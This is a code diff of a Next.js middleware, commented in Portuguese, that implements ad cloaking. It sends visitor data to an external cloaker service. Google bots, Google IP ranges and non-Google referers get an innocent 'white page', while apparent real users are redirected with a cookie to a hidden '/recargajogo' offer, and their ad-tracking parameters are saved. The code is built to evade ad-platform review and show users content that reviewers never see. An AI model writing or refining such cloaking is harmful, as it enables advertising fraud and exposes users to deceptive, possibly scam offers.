@@ -2,24 +2,40 @@ import { NextResponse } from 'next/server'
 import type { NextRequest } from 'next/server'
 
 // Configuração do cloaker
-const CLOAKER_CONFIG = {
-  url: `https://www.altercpa.one/fltr/${process.env.NEXT_PUBLIC_CLOAKER_TRACKING_ID || ''}`,
-  whitePagePath: '/',  // Página principal agora é white page
-  offerPagePath: '/promo'  // Página de oferta
+const CLOAKER_FILTER_ID = process.env.CLOAKER_FILTER_ID
+if (!CLOAKER_FILTER_ID) {
+  throw new Error('❌ CLOAKER_FILTER_ID não configurado no .env')
 }
+
+const CLOAKER_CONFIG = {
+  url: `https://www.altercpa.one/fltr/${CLOAKER_FILTER_ID}`,
+  whitePagePath: '/',  // Página principal agora é white page
+  offerPagePath: '/recargajogo'  // Página de oferta
+}
+
+// Cache para evitar múltiplas verificações do mesmo usuário
+const cloakerCache = new Map<string, { type: string; timestamp: number }>()
+const CACHE_DURATION = 60 * 1000 // 1 minuto
 
 export async function middleware(request: NextRequest) {
   const pathname = request.nextUrl.pathname
   const hostname = request.headers.get('host') || ''
   
-  // Pegar base URL do .env
-  const baseUrl = process.env.NEXT_PUBLIC_BASE_URL || 'https://localhost:3000'
+  // 🚫 IGNORAR requisições de assets, APIs e arquivos estáticos
+  const shouldIgnore = 
+    pathname.startsWith('/_next/') ||
+    pathname.startsWith('/api/') ||
+    pathname.includes('.') && !pathname.endsWith('/') || // Arquivos com extensão (exceto rotas)
+    pathname === '/favicon.ico' ||
+    pathname === '/robots.txt' ||
+    pathname === '/sitemap.xml'
   
-  // 🔓 LOCALHOST: Desativar TODAS as validações
-  if (hostname.includes('localhost') || hostname.includes('127.0.0.1')) {
-    console.log('🔓 [LOCALHOST] Todas as validações desativadas - acesso livre')
+  if (shouldIgnore) {
     return NextResponse.next()
   }
+  
+  // Pegar base URL do .env
+  const baseUrl = process.env.NEXT_PUBLIC_BASE_URL || 'https://localhost:3000'
   
   // 🛡️ SEGURANÇA: Bloquear acesso via IP
   if (/^\d+\.\d+\.\d+\.\d+/.test(hostname)) {
@@ -39,7 +55,16 @@ export async function middleware(request: NextRequest) {
   
   // Rotas da whitepage que NUNCA devem passar pelo cloaker
   // IMPORTANTE: "/" NÃO está aqui - deve passar pelo cloaker!
-  const whitePageRoutes = ['/loja', '/unsubscribe', '/ativar-conversao-google', '/meus-pedidos', '/blog']
+  const whitePageRoutes = [
+    '/loja', 
+    '/unsubscribe', 
+    '/ativar-conversao-google', 
+    '/meus-pedidos', 
+    '/blog',
+    '/politica-privacidade',
+    '/termos',
+    '/privacidade'
+  ]
   const isWhitePageRoute = whitePageRoutes.includes(pathname) || pathname.startsWith('/produto/') || pathname.startsWith('/blog/')
   
   // Verificar domínio - ativar cloaker para o domínio configurado
@@ -60,31 +85,37 @@ export async function middleware(request: NextRequest) {
     return NextResponse.next()
   }
   
-  // Rotas da whitepage sempre acessíveis (sem verificação de cloaker)
-  if (isWhitePageRoute) {
-    console.log(`✅ [Whitepage] Rota "${pathname}" sempre acessível - sem cloaker`)
-    return NextResponse.next()
-  }
-
-  // Proteger rota /promo - APENAS acessível com cookie do cloaker
-  // Usuários que tentarem acessar direto (mesmo com gclid) serão bloqueados
-  if (pathname === '/promo' || pathname === '/promo/') {
-    const hasValidCookie = request.cookies.get('cloaker_verified')?.value === 'true'
-    
-    // Se não tem cookie do cloaker, bloquear SEMPRE
-    if (!hasValidCookie) {
-      console.log('🚫 [Cloaker] Acesso a /promo sem cookie do cloaker - redirecionando para /')
-      return NextResponse.redirect(new URL('/', request.url))
+  // ✅ VERIFICAR COOKIE PRIMEIRO - Se tem cookie válido, libera TUDO
+  const cloakerCookie = request.cookies.get('cloaker_verified')
+  const hasValidCookie = cloakerCookie?.value === 'true'
+  
+  // Cookie já verificado - sem logs de debug
+  
+  if (hasValidCookie) {
+    // Se tem cookie mas está acessando a raiz (/) sem referer, redirecionar para /recargajogo
+    if (pathname === '/' || pathname === '') {
+      const referer = request.headers.get('referer') || ''
+      return NextResponse.redirect(new URL('/recargajogo', request.url))
     }
     
-    // Se tem cookie válido, deixar passar
-    console.log('✅ [Cloaker] Acesso a /promo permitido (cookie válido)')
+    // Usuário verificado - pode acessar qualquer rota
     return NextResponse.next()
   }
 
-  // Proteger rota /success - mas permitir Google Ads Bot
+  // Rotas da whitepage sempre acessíveis (sem verificação de cloaker)
+  if (isWhitePageRoute) {
+    return NextResponse.next()
+  }
+
+  // Proteger rota /promo - APENAS acessível com cookie do cloaker (manter proteção para não quebrar links antigos)
+  if (pathname === '/promo' || pathname === '/promo/') {
+    return NextResponse.redirect(new URL('/', request.url))
+  }
+
+  // Proteger rota /success - mas permitir Google Ads Bot e requisições internas
   if (pathname.startsWith('/success')) {
     const userAgent = request.headers.get('user-agent') || ''
+    const referer = request.headers.get('referer') || ''
     const url = request.nextUrl
     const hasTransactionId = url.searchParams.has('transactionId')
     const hasAmount = url.searchParams.has('amount')
@@ -92,20 +123,36 @@ export async function middleware(request: NextRequest) {
     // Detectar bots do Google (Googlebot, AdsBot, etc)
     const isGoogleBot = /googlebot|adsbot-google|google-ads/i.test(userAgent)
     
+    // Detectar requisições internas (UTMify, scripts do próprio site)
+    const isInternalRequest = referer.includes(request.headers.get('host') || '')
+    
     // Se é bot do Google, deixar passar SEMPRE (para registrar conversão)
     if (isGoogleBot) {
-      console.log('🤖 [Success] Google Bot detectado - permitindo acesso')
       return NextResponse.next()
     }
     
-    // Se não é bot e não tem parâmetros, redirecionar para white page
+    // Se é requisição interna (UTMify), deixar passar
+    if (isInternalRequest) {
+      return NextResponse.next()
+    }
+    
+    // Se não é bot/interno e não tem parâmetros, redirecionar para white page
     if (!hasTransactionId || !hasAmount) {
-      console.log('🚫 [Success] Acesso sem parâmetros obrigatórios - redirecionando para /')
       return NextResponse.redirect(new URL('/', request.url))
     }
     
-    // Se tem parâmetros válidos (usuário real vindo do checkout), deixar passar
-    return NextResponse.next()
+    // Se chegou aqui sem cookie, bloquear
+    return NextResponse.redirect(new URL('/', request.url))
+  }
+
+  // Proteger rota /checkout - APENAS acessível com cookie (vem do /recargajogo)
+  if (pathname.startsWith('/checkout')) {
+    return NextResponse.redirect(new URL('/', request.url))
+  }
+
+  // Proteger rota /recargajogo - APENAS acessível com cookie do cloaker
+  if (pathname.startsWith('/recargajogo')) {
+    return NextResponse.redirect(new URL('/', request.url))
   }
 
   // Não aplicar cloaker nas rotas internas e arquivos estáticos (deixar passar)
@@ -114,7 +161,8 @@ export async function middleware(request: NextRequest) {
     pathname.startsWith('/_next/') ||
     pathname.startsWith('/images') ||
     // pathname.startsWith('/success') || // REMOVIDO - /success tem verificação própria acima
-    pathname.startsWith('/checkout') ||
+    // pathname.startsWith('/checkout') || // REMOVIDO - /checkout tem verificação própria acima
+    pathname.startsWith('/analytics') ||
     pathname.startsWith('/fonts') ||
     pathname.startsWith('/manifest') ||
     pathname.startsWith('/icon-') ||
@@ -138,19 +186,61 @@ export async function middleware(request: NextRequest) {
   }
 
   // Se não for rota raiz (/), redirecionar para / (white page)
-  // Isso captura TODAS as rotas inválidas
   if (pathname !== '/') {
-    console.log(`🚫 [Cloaker] Rota inválida "${pathname}" - redirecionando para / (white page)`)
     return NextResponse.redirect(new URL('/', request.url))
   }
 
-  // IMPORTANTE: Se usuário tem cookie válido, REDIRECIONAR para /promo
-  // Usuário real NUNCA deve ver white page novamente
-  const hasValidCookie = request.cookies.get('cloaker_verified')?.value === 'true'
+  // ===== APENAS ROTA / (raiz) chega aqui =====
+  // Cookie já foi verificado no início - se chegou aqui, não tem cookie
+
+  // 🛡️ FILTRO DE REFERER: Verificar se vem do Google (APENAS para rota /)
+  const referer = request.headers.get('referer') || ''
+  const isFromGoogle = referer === 'https://www.google.com/'
   
-  if (hasValidCookie) {
-    console.log('✅ [Cloaker] Usuário com cookie válido - redirecionando para /promo')
-    return NextResponse.redirect(new URL('/promo', request.url))
+  // Se NÃO vem do Google = BOT!
+  if (!isFromGoogle) {
+    return NextResponse.next() // Mostrar white page sem chamar cloaker
+  }
+
+  // 🚀 VERIFICAR IP DO GOOGLE: Bloquear AdsBot que simula usuário real
+  const clientIp = request.headers.get('cf-connecting-ip') || request.headers.get('x-forwarded-for') || request.ip || 'unknown'
+  
+  // Verificar se é IP do Google (AdsBot, Googlebot, etc)
+  const isGoogleIP = clientIp.startsWith('2001:4860:') || // IPv6 Google
+                     clientIp.startsWith('66.249.') ||    // Googlebot IPv4
+                     clientIp.startsWith('66.102.') ||    // Google IPv4
+                     clientIp.startsWith('64.233.') ||    // Google IPv4
+                     clientIp.startsWith('72.14.') ||     // Google IPv4
+                     clientIp.startsWith('209.85.') ||    // Google IPv4
+                     clientIp.startsWith('216.239.')      // Google IPv4
+  
+  if (isGoogleIP) {
+    console.log(`🤖 [Cloaker] Bot do Google detectado (IP: ${clientIp}) - mostrando white page`)
+    return NextResponse.next() // Mostrar white page sem chamar cloaker
+  }
+
+  // 🚀 CACHE: Verificar se já verificamos este usuário recentemente
+  const userAgent = request.headers.get('user-agent') || ''
+  const cacheKey = `${clientIp}-${userAgent.substring(0, 50)}` // Limitar tamanho
+  
+  const cached = cloakerCache.get(cacheKey)
+  if (cached && (Date.now() - cached.timestamp) < CACHE_DURATION) {
+    // Usar resultado do cache
+    if (cached.type === 'white') {
+      return NextResponse.next() // Mostrar white page
+    } else {
+      // Redirecionar para /recargajogo
+      const redirectUrl = new URL(CLOAKER_CONFIG.offerPagePath, request.url)
+      redirectUrl.search = request.nextUrl.search
+      const response = NextResponse.redirect(redirectUrl)
+      response.cookies.set('cloaker_verified', 'true', {
+        httpOnly: true,
+        secure: true,
+        sameSite: 'lax',
+        maxAge: 60 * 60 * 24
+      })
+      return response
+    }
   }
 
   try {
@@ -175,13 +265,7 @@ export async function middleware(request: NextRequest) {
       HTTP_SEC_CH_UA_PLATFORM: request.headers.get('sec-ch-ua-platform') || '',
     }
 
-    console.log('🔍 [Cloaker] Verificando acesso:', {
-      ip: serverData.HTTP_CF_CONNECTING_IP || serverData.REMOTE_ADDR,
-      userAgent: serverData.HTTP_USER_AGENT,
-      referer: serverData.HTTP_REFERER || 'direct',
-      queryString: serverData.QUERY_STRING,
-      url: request.nextUrl.pathname + request.nextUrl.search
-    })
+    // Verificando acesso no cloaker
 
     // Fazer requisição para o cloaker (EXATAMENTE como o PHP)
     const formBody = new URLSearchParams(serverData as any).toString()
@@ -203,39 +287,39 @@ export async function middleware(request: NextRequest) {
     if (responseText && responseText.trim()) {
       try {
         result = JSON.parse(responseText)
-        console.log('📥 [Cloaker] Resposta:', {
-          type: result.type,
-          result: result.result,
-          action: result.action,
-          reason: result.reason,
-          url: result.url,
-          referer: serverData.HTTP_REFERER || 'direct'
-        })
       } catch (e) {
-        console.log('⚠️ [Cloaker] Erro ao parsear JSON - usando fallback (white)')
         result = {
           type: 'white',
           url: baseUrl + '/'
         }
       }
     } else {
-      console.log('⚠️ [Cloaker] Resposta vazia - usando fallback (white)')
-      // Fallback IGUAL ao PHP: se vazio, mostrar white page
+      // Fallback: se vazio, mostrar white page
       result = {
         type: 'white',
         url: baseUrl + '/'
       }
     }
 
+    // Salvar no cache
+    cloakerCache.set(cacheKey, {
+      type: result.type,
+      timestamp: Date.now()
+    })
+
+    // Limpar cache antigo (mais de 5 minutos)
+    for (const [key, value] of cloakerCache.entries()) {
+      if (Date.now() - value.timestamp > 5 * 60 * 1000) {
+        cloakerCache.delete(key)
+      }
+    }
+
     // Se for "white" (bot/crawler), mostrar white page (/)
     if (result.type === 'white') {
-      console.log('🤖 [Cloaker] BOT detectado - mostrando white page (/)')
-      // Deixar passar normalmente - a rota / já é a white page
       return NextResponse.next()
     }
 
-    // Se for "black" (usuário real), REDIRECIONAR para /promo com cookie
-    console.log('👤 [Cloaker] USUÁRIO REAL - redirecionando para /promo')
+    // Se for "black" (usuário real), REDIRECIONAR para /recargajogo com cookie
     
     // Criar URL sem barra final
     const redirectUrl = new URL(CLOAKER_CONFIG.offerPagePath, request.url)
@@ -249,6 +333,27 @@ export async function middleware(request: NextRequest) {
       secure: true,    // Apenas HTTPS
       sameSite: 'lax', // Proteção CSRF
       maxAge: 60 * 60 * 24 // 24 horas
+    })
+    
+    // Salvar UTMs em cookie
+    const utmParams = [
+      'utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term',
+      'gclid', 'fbclid', 'msclkid', 'ttclid',
+      'gad_source', 'gad_campaignid', 'gbraid', 'wbraid',
+      'src', 'sck', 'xcod', 'keyword', 'device', 'network', 'cuponeria'
+    ]
+    
+    const searchParams = request.nextUrl.searchParams
+    utmParams.forEach(param => {
+      const value = searchParams.get(param)
+      if (value) {
+        response.cookies.set(`utmify_${param}`, value, {
+          httpOnly: false,
+          secure: true,
+          sameSite: 'lax',
+          maxAge: 60 * 60 * 24 * 30
+        })
+      }
     })
     
     return response
